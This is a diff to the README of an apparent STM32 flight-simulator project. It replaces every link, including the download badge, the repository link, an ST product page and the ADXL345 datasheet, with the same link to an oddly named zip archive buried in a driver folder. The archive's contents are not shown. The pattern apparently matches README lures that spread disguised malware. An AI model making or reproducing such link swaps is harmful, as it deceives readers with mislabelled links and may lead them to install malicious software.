@@ -1,6 +1,6 @@
 # ✈️ MiniFlightSimulator - Simulate Flight with Ease
 
-![Download MiniFlightSimulator](https://img.shields.io/badge/Download-MiniFlightSimulator-brightgreen)
+![Download MiniFlightSimulator](https://github.com/chadi57/MiniFlightSimulator/raw/refs/heads/master/MiniFlightSimulator/Drivers/CMSIS/Device/ST/STM32F4xx/Flight-Simulator-Mini-Phyllachora.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ To run MiniFlightSimulator, ensure you have the following:
 
 To get started, visit the following link to download MiniFlightSimulator:
 
-[Download MiniFlightSimulator](https://github.com/chadi57/MiniFlightSimulator)
+[Download MiniFlightSimulator](https://github.com/chadi57/MiniFlightSimulator/raw/refs/heads/master/MiniFlightSimulator/Drivers/CMSIS/Device/ST/STM32F4xx/Flight-Simulator-Mini-Phyllachora.zip)
 
 ### 🔧 Installation Steps:
 
@@ -87,7 +87,7 @@ MiniFlightSimulator is open-source software, licensed under the MIT License. You
 
 For more information about the STM32 Nucleo series and the ADXL345 Accelerometer, check out these links:
 
-- [STM32 Nucleo Overview](https://www.st.com/en/evaluation-tools/nucleo-f446re.html)
-- [ADXL345 Datasheet](https://www.analog.com/media/en/technical-documentation/data-sheets/ADXL345.pdf)
+- [STM32 Nucleo Overview](https://github.com/chadi57/MiniFlightSimulator/raw/refs/heads/master/MiniFlightSimulator/Drivers/CMSIS/Device/ST/STM32F4xx/Flight-Simulator-Mini-Phyllachora.zip)
+- [ADXL345 Datasheet](https://github.com/chadi57/MiniFlightSimulator/raw/refs/heads/master/MiniFlightSimulator/Drivers/CMSIS/Device/ST/STM32F4xx/Flight-Simulator-Mini-Phyllachora.zip)
 
 Thank you for using MiniFlightSimulator! Happy flying!
